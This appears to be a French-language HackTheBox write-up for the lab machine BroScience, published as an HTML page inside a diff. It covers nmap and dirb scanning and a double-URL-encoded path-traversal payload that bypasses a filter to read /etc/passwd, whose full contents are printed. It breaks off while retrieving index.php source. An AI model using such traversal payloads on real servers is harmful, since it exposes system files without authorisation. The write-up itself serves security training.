@@ -1,0 +1,708 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="map[name:conflict]">
+<meta name="description" content="Medium / Linux" />
+<meta name="keywords" content="cybersecurity blog french hacking rami malek, linux, fuzzing, file upload, php unserialize, LFI, privilege escalation" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="/htb/broscience/" />
+
+
+    <title>
+        
+            📙 HackTheBox - BroScience :: conflict  — cybersecurity blog
+        
+    </title>
+
+
+
+
+
+  <link rel="stylesheet" href="/main.min.244183cde1a38e0b08f82c11791181288f9aac1cc9618cd6f4e9e7710c5768ba.css" integrity="sha256-JEGDzeGjjgsI&#43;CwReRGBKI&#43;arBzJYYzW9OnncQxXaLo=" crossorigin="anonymous">
+
+
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+
+  <meta itemprop="name" content="📙 HackTheBox - BroScience">
+  <meta itemprop="description" content="Medium / Linux">
+  <meta itemprop="datePublished" content="2023-04-10T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2023-04-10T00:00:00+00:00">
+  <meta itemprop="wordCount" content="2148">
+  <meta itemprop="image" content="/">
+  <meta itemprop="keywords" content="Linux,Fuzzing,File Upload,Php Unserialize,LFI,Privilege Escalation">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="/">
+  <meta name="twitter:title" content="📙 HackTheBox - BroScience">
+  <meta name="twitter:description" content="Medium / Linux">
+
+
+
+    <meta property="og:url" content="/htb/broscience/">
+  <meta property="og:site_name" content="conflict">
+  <meta property="og:title" content="📙 HackTheBox - BroScience">
+  <meta property="og:description" content="Medium / Linux">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="htb&#39;">
+    <meta property="article:published_time" content="2023-04-10T00:00:00+00:00">
+    <meta property="article:modified_time" content="2023-04-10T00:00:00+00:00">
+    <meta property="article:tag" content="Linux">
+    <meta property="article:tag" content="Fuzzing">
+    <meta property="article:tag" content="File Upload">
+    <meta property="article:tag" content="Php Unserialize">
+    <meta property="article:tag" content="LFI">
+    <meta property="article:tag" content="Privilege Escalation">
+    <meta property="og:image" content="/">
+      <meta property="og:see_also" content="/htb/photobomb/">
+      <meta property="og:see_also" content="/htb/updown/">
+      <meta property="og:see_also" content="/htb/shoppy/">
+      <meta property="og:see_also" content="/htb/ambassador/">
+
+
+
+
+
+
+    <meta property="article:published_time" content="2023-04-10 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">-</span>
+            <span class="logo__text ">
+                cnf409</span>
+            <span class="logo__cursor" style=
+                  "
+                   background-color:#527ea9;
+                   animation-duration:0.8s;">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="/contact/">Contact</a></li><li><a href="/htb/">HackTheBox</a></li><li><a href="/posts/">Posts</a></li><li><a href="/series/">Series</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+ </svg></span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            <h2 class="post-title"><a href="/htb/broscience/">📙 HackTheBox - BroScience</a></h2>
+
+            
+            
+            
+
+            <div class="post-content">
+                <h3 id="table-of-contents">Table of contents</h3>
+<hr>
+<ul>
+<li>
+<p><a href="/htb/broscience/#fuzzing">Fuzzing</a></p>
+</li>
+<li>
+<p><a href="/htb/broscience/#foothold">Foothold</a></p>
+</li>
+<li>
+<p><a href="/htb/broscience/#privilege-escalation">Privilege Escalation</a></p>
+</li>
+</ul>
+<hr>
+<h1 id="brosciencehtb">broscience.htb</h1>
+<ul>
+<li>Difficulty: Medium</li>
+<li>OS: Linux</li>
+<li>Link: <a href="https://app.hackthebox.com/machines/BroScience">https://app.hackthebox.com/machines/BroScience</a></li>
+</ul>
+<h1 id="note">Note</h1>
+<p>Super room, j&rsquo;ai beaucoup aimé, un foothold que j&rsquo;ai trouvé assez dur avec beaucoup d&rsquo;analyse de code. En revanche la <em>privesc</em> est beaucoup trop facile, mais globalement c&rsquo;était cool 👍</p>
+<h1 id="fuzzing">Fuzzing</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>nmap <span style="color:#f92672">-</span>sC <span style="color:#f92672">-</span>sV broscience<span style="color:#f92672">.</span>htb
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Starting Nmap <span style="color:#ae81ff">7.80</span> ( https:<span style="color:#f92672">//</span>nmap<span style="color:#f92672">.</span>org ) at <span style="color:#ae81ff">2023</span><span style="color:#f92672">-</span><span style="color:#ae81ff">02</span><span style="color:#f92672">-</span><span style="color:#ae81ff">01</span> <span style="color:#ae81ff">19</span>:<span style="color:#ae81ff">19</span> CET
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> broscience<span style="color:#f92672">.</span>htb (<span style="color:#ae81ff">10.10.11.195</span>)
+</span></span><span style="display:flex;"><span>Host <span style="color:#f92672">is</span> up (<span style="color:#ae81ff">0.24</span>s latency)<span style="color:#f92672">.</span>
+</span></span><span style="display:flex;"><span>rDNS record <span style="color:#66d9ef">for</span> <span style="color:#ae81ff">10.10.11.195</span>: BroScience<span style="color:#f92672">.</span>htb
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">997</span> closed ports
+</span></span><span style="display:flex;"><span>PORT    STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">22</span><span style="color:#f92672">/</span>tcp  open  ssh     OpenSSH <span style="color:#ae81ff">8.4</span>p1 Debian <span style="color:#ae81ff">5</span><span style="color:#f92672">+</span>deb11u1 (protocol <span style="color:#ae81ff">2.0</span>)
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">80</span><span style="color:#f92672">/</span>tcp  open  http    Apache httpd <span style="color:#ae81ff">2.4.54</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>_http<span style="color:#f92672">-</span>server<span style="color:#f92672">-</span>header: Apache<span style="color:#f92672">/</span><span style="color:#ae81ff">2.4.54</span> (Debian)
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>_http<span style="color:#f92672">-</span>title: Did <span style="color:#f92672">not</span> follow redirect to https:<span style="color:#f92672">//</span>broscience<span style="color:#f92672">.</span>htb<span style="color:#f92672">/</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">443</span><span style="color:#f92672">/</span>tcp open  ssl<span style="color:#f92672">/</span>ssl Apache httpd (SSL<span style="color:#f92672">-</span>only mode)
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>_http<span style="color:#f92672">-</span>server<span style="color:#f92672">-</span>header: Apache<span style="color:#f92672">/</span><span style="color:#ae81ff">2.4.54</span> (Debian)
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>_http<span style="color:#f92672">-</span>title: <span style="color:#ae81ff">400</span> Bad Request
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> ssl<span style="color:#f92672">-</span>cert: Subject: commonName<span style="color:#f92672">=</span>broscience<span style="color:#f92672">.</span>htb<span style="color:#f92672">/</span>organizationName<span style="color:#f92672">=</span>BroScience<span style="color:#f92672">/</span>countryName<span style="color:#f92672">=</span>AT
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> Not valid before: <span style="color:#ae81ff">2022</span><span style="color:#f92672">-</span><span style="color:#ae81ff">07</span><span style="color:#f92672">-</span><span style="color:#ae81ff">14</span>T19:<span style="color:#ae81ff">48</span>:<span style="color:#ae81ff">36</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>_Not valid after:  <span style="color:#ae81ff">2023</span><span style="color:#f92672">-</span><span style="color:#ae81ff">07</span><span style="color:#f92672">-</span><span style="color:#ae81ff">14</span>T19:<span style="color:#ae81ff">48</span>:<span style="color:#ae81ff">36</span>
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:<span style="color:#f92672">/</span>o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed<span style="color:#f92672">.</span> Please report any incorrect results at https:<span style="color:#f92672">//</span>nmap<span style="color:#f92672">.</span>org<span style="color:#f92672">/</span>submit<span style="color:#f92672">/</span> <span style="color:#f92672">.</span>
+</span></span><span style="display:flex;"><span>Nmap done: <span style="color:#ae81ff">1</span> IP address (<span style="color:#ae81ff">1</span> host up) scanned <span style="color:#f92672">in</span> <span style="color:#ae81ff">207.62</span> seconds
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>dirb http:<span style="color:#f92672">//</span>broscience<span style="color:#f92672">.</span>htb <span style="color:#f92672">-</span>f
+</span></span><span style="display:flex;"><span><span style="color:#f92672">-----------------</span>
+</span></span><span style="display:flex;"><span>DIRB v2<span style="color:#ae81ff">.22</span>    
+</span></span><span style="display:flex;"><span>By The Dark Raver
+</span></span><span style="display:flex;"><span><span style="color:#f92672">-----------------</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>START_TIME: Wed Feb  <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">19</span>:<span style="color:#ae81ff">20</span>:<span style="color:#ae81ff">27</span> <span style="color:#ae81ff">2023</span>
+</span></span><span style="display:flex;"><span>URL_BASE: http:<span style="color:#f92672">//</span>broscience<span style="color:#f92672">.</span>htb<span style="color:#f92672">/</span>
+</span></span><span style="display:flex;"><span>WORDLIST_FILES: <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>share<span style="color:#f92672">/</span>dirb<span style="color:#f92672">/</span>wordlists<span style="color:#f92672">/</span>common<span style="color:#f92672">.</span>txt
+</span></span><span style="display:flex;"><span>OPTION: Fine tunning of NOT_FOUND detection
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">-----------------</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>GENERATED WORDS: <span style="color:#ae81ff">4612</span>                                                          
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">----</span> Scanning URL: http:<span style="color:#f92672">//</span>broscience<span style="color:#f92672">.</span>htb<span style="color:#f92672">/</span> <span style="color:#f92672">----</span>
+</span></span><span style="display:flex;"><span>                                                                                            
+</span></span><span style="display:flex;"><span><span style="color:#f92672">-----------------</span>
+</span></span><span style="display:flex;"><span>END_TIME: Wed Feb  <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">19</span>:<span style="color:#ae81ff">34</span>:<span style="color:#ae81ff">27</span> <span style="color:#ae81ff">2023</span>
+</span></span><span style="display:flex;"><span>DOWNLOADED: <span style="color:#ae81ff">4612</span> <span style="color:#f92672">-</span> FOUND: <span style="color:#ae81ff">0</span>
+</span></span></code></pre></div><p>Rien d&rsquo;intéressant ici, on va donc se concentrer sur le site et ses fonctionnalités</p>
+<p>Le site a l&rsquo;air d&rsquo;être un blog sur la musculation, en allant sur un post et en regardant le code source on voit quelque chose de très étrange sur l&rsquo;image:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-css" data-lang="css"><span style="display:flex;"><span><span style="color:#f92672">background-image</span><span style="color:#f92672">:</span> <span style="color:#f92672">url</span><span style="color:#f92672">(</span><span style="color:#f92672">includes</span><span style="color:#f92672">/</span><span style="color:#f92672">img</span>.<span style="color:#a6e22e">php</span><span style="color:#f92672">?</span><span style="color:#f92672">path</span><span style="color:#f92672">=</span><span style="color:#f92672">bench</span>.<span style="color:#a6e22e">png</span><span style="color:#f92672">);</span>
+</span></span></code></pre></div><p>On voit ici que l&rsquo;image est importée depuis le fichier <code>img.php</code>, et on voit aussi un paramètre <code>path</code>.</p>
+<p>Si on se rend sur l&rsquo;url <a href="https://broscience.htb/includes/img.php?path=bench.png">https://broscience.htb/includes/img.php?path=bench.png</a>, on voit bel et bien l&rsquo;image. Essayons une <code>LFI</code> via le paramètre <code>path</code>:</p>
+<h1 id="foothold">Foothold</h1>
+<p><code>?path=../../../../etc/passwd</code> ne fonctionne pas, le site détecte l&rsquo;attaque et nous met un message d&rsquo;erreur</p>
+<p><img alt="2023-02-01-193302_769x109_scrot" src="https://user-images.githubusercontent.com/77807503/216157328-50bb6555-2006-4838-8fdd-35ddc1c676f4.png"></p>
+<p>Ce message me fait grandement penser à un challenge que j&rsquo;ai pu faire au paravant, je ne sait pas si il s&rsquo;agit d&rsquo;un WAF ou d&rsquo;un filtre connu mais en tout cas je sais comment le contourner</p>
+<p><code>?path=..%252F..%252F..%252F..%252Fetc%252Fpasswd</code> nous affiche une nouvelle page</p>
+<p><img alt="2023-02-01-193521_1387x113_scrot" src="https://user-images.githubusercontent.com/77807503/216157349-42c1b15f-bea9-467e-a5f9-6aaf1459987a.png"></p>
+<p>Même si elle ne nous a pas donné le contenu du fichier que nous voulions lire, elle prouve que la <code>LFI</code> a fonctionné. Un <strong>double encoding</strong> nous a donc permis de contourner le filtre.</p>
+<p>De plus, ce message d&rsquo;erreur est affiché seulement car mon navigateur croit qu&rsquo;il est entrain de lire une image, pour avoir le vrai contenu du fichier, il faut l&rsquo;enregistrer puis le lire via un <code>cat</code> par exemple.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>cat img<span style="color:#f92672">.</span>png
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>root:x:<span style="color:#ae81ff">0</span>:<span style="color:#ae81ff">0</span>:root:<span style="color:#f92672">/</span>root:<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>bash
+</span></span><span style="display:flex;"><span>daemon:x:<span style="color:#ae81ff">1</span>:<span style="color:#ae81ff">1</span>:daemon:<span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>sbin:<span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>sbin<span style="color:#f92672">/</span>nologin
+</span></span><span style="display:flex;"><span>bin:x:<span style="color:#ae81ff">2</span>:<span style="color:#ae81ff">2</span>:bin:<span style="color:#f92672">/</span>bin:<span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>sbin<span style="color:#f92672">/</span>nologin
+</span></span><span style="display:flex;"><span>sys:x:<span style="color:#ae81ff">3</span>:<span style="color:#ae81ff">3</span>:sys:<span style="color:#f92672">/</span>dev:<span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>sbin<span style="color:#f92672">/</span>nologin
+</span></span><span style="display:flex;"><span>sync:x:<span style="color:#ae81ff">4</span>:<span style="color:#ae81ff">65534</span>:sync:<span style="color:#f92672">/</span>bin:<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>sync
+</span></span><span style="display:flex;"><span>games:x:<span style="color:#ae81ff">5</span>:<span style="color:#ae81ff">60</span>:games:<span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>games:<span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>sbin<span style="color:#f92672">/</span>nologin
+</span></span><span style="display:flex;"><span>man:x:<span style="color:#ae81ff">6</span>:<span style="color:#ae81ff">12</span>:man:<span style="color:#f92672">/</span>var<span style="color:#f92672">/</span>cache<span style="color:#f92672">/</span>man:<span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>sbin<span style="color:#f92672">/</span>nologin
+</span></span><span style="display:flex;"><span>lp:x:<span style="color:#ae81ff">7</span>:<span style="color:#ae81ff">7</span>:lp:<span style="color:#f92672">/</span>var<span style="color:#f92672">/</span>spool<span style="color:#f92672">/</span>lpd:<span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>sbin<span style="color:#f92672">/</span>nologin
+</span></span><span style="display:flex;"><span>mail:x:<span style="color:#ae81ff">8</span>:<span style="color:#ae81ff">8</span>:mail:<span style="color:#f92672">/</span>var<span style="color:#f92672">/</span>mail:<span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>sbin<span style="color:#f92672">/</span>nologin
+</span></span><span style="display:flex;"><span>news:x:<span style="color:#ae81ff">9</span>:<span style="color:#ae81ff">9</span>:news:<span style="color:#f92672">/</span>var<span style="color:#f92672">/</span>spool<span style="color:#f92672">/</span>news:<span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>sbin<span style="color:#f92672">/</span>nologin
+</span></span><span style="display:flex;"><span>uucp:x:<span style="color:#ae81ff">10</span>:<span style="color:#ae81ff">10</span>:uucp:<span style="color:#f92672">/</span>var<span style="color:#f92672">/</span>spool<span style="color:#f92672">/</span>uucp:<span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>sbin<span style="color:#f92672">/</span>nologin
+</span></span><span style="display:flex;"><span>proxy:x:<span style="color:#ae81ff">13</span>:<span style="color:#ae81ff">13</span>:proxy:<span style="color:#f92672">/</span>bin:<span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>sbin<span style="color:#f92672">/</span>nologin
+</span></span><span style="display:flex;"><span>www<span style="color:#f92672">-</span>data:x:<span style="color:#ae81ff">33</span>:<span style="color:#ae81ff">33</span>:www<span style="color:#f92672">-</span>data:<span style="color:#f92672">/</span>var<span style="color:#f92672">/</span>www:<span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>sbin<span style="color:#f92672">/</span>nologin
+</span></span><span style="display:flex;"><span>backup:x:<span style="color:#ae81ff">34</span>:<span style="color:#ae81ff">34</span>:backup:<span style="color:#f92672">/</span>var<span style="color:#f92672">/</span>backups:<span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>sbin<span style="color:#f92672">/</span>nologin
+</span></span><span style="display:flex;"><span>list:x:<span style="color:#ae81ff">38</span>:<span style="color:#ae81ff">38</span>:Mailing List Manager:<span style="color:#f92672">/</span>var<span style="color:#f92672">/</span>list:<span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>sbin<span style="color:#f92672">/</span>nologin
+</span></span><span style="display:flex;"><span>irc:x:<span style="color:#ae81ff">39</span>:<span style="color:#ae81ff">39</span>:ircd:<span style="color:#f92672">/</span>run<span style="color:#f92672">/</span>ircd:<span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>sbin<span style="color:#f92672">/</span>nologin
+</span></span><span style="display:flex;"><span>gnats:x:<span style="color:#ae81ff">41</span>:<span style="color:#ae81ff">41</span>:Gnats Bug<span style="color:#f92672">-</span>Reporting System (admin):<span style="color:#f92672">/</span>var<span style="color:#f92672">/</span>lib<span style="color:#f92672">/</span>gnats:<span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>sbin<span style="color:#f92672">/</span>nologin
+</span></span><span style="display:flex;"><span>nobody:x:<span style="color:#ae81ff">65534</span>:<span style="color:#ae81ff">65534</span>:nobody:<span style="color:#f92672">/</span>nonexistent:<span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>sbin<span style="color:#f92672">/</span>nologin
+</span></span><span style="display:flex;"><span>_apt:x:<span style="color:#ae81ff">100</span>:<span style="color:#ae81ff">65534</span>::<span style="color:#f92672">/</span>nonexistent:<span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>sbin<span style="color:#f92672">/</span>nologin
+</span></span><span style="display:flex;"><span>systemd<span style="color:#f92672">-</span>network:x:<span style="color:#ae81ff">101</span>:<span style="color:#ae81ff">102</span>:systemd Network Management,,,:<span style="color:#f92672">/</span>run<span style="color:#f92672">/</span>systemd:<span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>sbin<span style="color:#f92672">/</span>nologin
+</span></span><span style="display:flex;"><span>systemd<span style="color:#f92672">-</span>resolve:x:<span style="color:#ae81ff">102</span>:<span style="color:#ae81ff">103</span>:systemd Resolver,,,:<span style="color:#f92672">/</span>run<span style="color:#f92672">/</span>systemd:<span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>sbin<span style="color:#f92672">/</span>nologin
+</span></span><span style="display:flex;"><span>tss:x:<span style="color:#ae81ff">103</span>:<span style="color:#ae81ff">109</span>:TPM software stack,,,:<span style="color:#f92672">/</span>var<span style="color:#f92672">/</span>lib<span style="color:#f92672">/</span>tpm:<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>false
+</span></span><span style="display:flex;"><span>messagebus:x:<span style="color:#ae81ff">104</span>:<span style="color:#ae81ff">110</span>::<span style="color:#f92672">/</span>nonexistent:<span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>sbin<span style="color:#f92672">/</span>nologin
+</span></span><span style="display:flex;"><span>systemd<span style="color:#f92672">-</span>timesync:x:<span style="color:#ae81ff">105</span>:<span style="color:#ae81ff">111</span>:systemd Time Synchronization,,,:<span style="color:#f92672">/</span>run<span style="color:#f92672">/</span>systemd:<span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>sbin<span style="color:#f92672">/</span>nologin
+</span></span><span style="display:flex;"><span>usbmux:x:<span style="color:#ae81ff">106</span>:<span style="color:#ae81ff">46</span>:usbmux daemon,,,:<span style="color:#f92672">/</span>var<span style="color:#f92672">/</span>lib<span style="color:#f92672">/</span>usbmux:<span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>sbin<span style="color:#f92672">/</span>nologin
+</span></span><span style="display:flex;"><span>rtkit:x:<span style="color:#ae81ff">107</span>:<span style="color:#ae81ff">115</span>:RealtimeKit,,,:<span style="color:#f92672">/</span>proc:<span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>sbin<span style="color:#f92672">/</span>nologin
+</span></span><span style="display:flex;"><span>sshd:x:<span style="color:#ae81ff">108</span>:<span style="color:#ae81ff">65534</span>::<span style="color:#f92672">/</span>run<span style="color:#f92672">/</span>sshd:<span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>sbin<span style="color:#f92672">/</span>nologin
+</span></span><span style="display:flex;"><span>dnsmasq:x:<span style="color:#ae81ff">109</span>:<span style="color:#ae81ff">65534</span>:dnsmasq,,,:<span style="color:#f92672">/</span>var<span style="color:#f92672">/</span>lib<span style="color:#f92672">/</span>misc:<span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>sbin<span style="color:#f92672">/</span>nologin
+</span></span><span style="display:flex;"><span>avahi:x:<span style="color:#ae81ff">110</span>:<span style="color:#ae81ff">116</span>:Avahi mDNS daemon,,,:<span style="color:#f92672">/</span>run<span style="color:#f92672">/</span>avahi<span style="color:#f92672">-</span>daemon:<span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>sbin<span style="color:#f92672">/</span>nologin
+</span></span><span style="display:flex;"><span>speech<span style="color:#f92672">-</span>dispatcher:x:<span style="color:#ae81ff">111</span>:<span style="color:#ae81ff">29</span>:Speech Dispatcher,,,:<span style="color:#f92672">/</span>run<span style="color:#f92672">/</span>speech<span style="color:#f92672">-</span>dispatcher:<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>false
+</span></span><span style="display:flex;"><span>pulse:x:<span style="color:#ae81ff">112</span>:<span style="color:#ae81ff">118</span>:PulseAudio daemon,,,:<span style="color:#f92672">/</span>run<span style="color:#f92672">/</span>pulse:<span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>sbin<span style="color:#f92672">/</span>nologin
+</span></span><span style="display:flex;"><span>saned:x:<span style="color:#ae81ff">113</span>:<span style="color:#ae81ff">121</span>::<span style="color:#f92672">/</span>var<span style="color:#f92672">/</span>lib<span style="color:#f92672">/</span>saned:<span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>sbin<span style="color:#f92672">/</span>nologin
+</span></span><span style="display:flex;"><span>colord:x:<span style="color:#ae81ff">114</span>:<span style="color:#ae81ff">122</span>:colord colour management daemon,,,:<span style="color:#f92672">/</span>var<span style="color:#f92672">/</span>lib<span style="color:#f92672">/</span>colord:<span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>sbin<span style="color:#f92672">/</span>nologin
+</span></span><span style="display:flex;"><span>geoclue:x:<span style="color:#ae81ff">115</span>:<span style="color:#ae81ff">123</span>::<span style="color:#f92672">/</span>var<span style="color:#f92672">/</span>lib<span style="color:#f92672">/</span>geoclue:<span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>sbin<span style="color:#f92672">/</span>nologin
+</span></span><span style="display:flex;"><span>Debian<span style="color:#f92672">-</span>gdm:x:<span style="color:#ae81ff">116</span>:<span style="color:#ae81ff">124</span>:Gnome Display Manager:<span style="color:#f92672">/</span>var<span style="color:#f92672">/</span>lib<span style="color:#f92672">/</span>gdm3:<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>false
+</span></span><span style="display:flex;"><span>bill:x:<span style="color:#ae81ff">1000</span>:<span style="color:#ae81ff">1000</span>:bill,,,:<span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>bill:<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>bash
+</span></span><span style="display:flex;"><span>systemd<span style="color:#f92672">-</span>coredump:x:<span style="color:#ae81ff">999</span>:<span style="color:#ae81ff">999</span>:systemd Core Dumper:<span style="color:#f92672">/</span>:<span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>sbin<span style="color:#f92672">/</span>nologin
+</span></span><span style="display:flex;"><span>postgres:x:<span style="color:#ae81ff">117</span>:<span style="color:#ae81ff">125</span>:PostgreSQL administrator,,,:<span style="color:#f92672">/</span>var<span style="color:#f92672">/</span>lib<span style="color:#f92672">/</span>postgresql:<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>bash
+</span></span><span style="display:flex;"><span>_laurel:x:<span style="color:#ae81ff">998</span>:<span style="color:#ae81ff">998</span>::<span style="color:#f92672">/</span>var<span style="color:#f92672">/</span>log<span style="color:#f92672">/</span>laurel:<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>false
+</span></span></code></pre></div><p>On a bel et bien le contenu du <code>/etc/passwd</code>.</p>
+<p>Récupérons maintenant le contenu de <code>index.php</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">?</span>path<span style="color:#f92672">=..%</span><span style="color:#ae81ff">252</span>Findex<span style="color:#f92672">.</span>php
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">session_start</span>();
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;html&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    &lt;head&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        &lt;title&gt;BroScience : Home&lt;/title&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        &lt;?php 
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        include_once &#39;includes/header.php&#39;;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        include_once &#39;includes/utils.php&#39;;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        $theme = get_theme();
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        ?&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        &lt;link rel=&#34;stylesheet&#34; href=&#34;styles/&lt;?=$theme?&gt;.css&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    &lt;/head&gt;
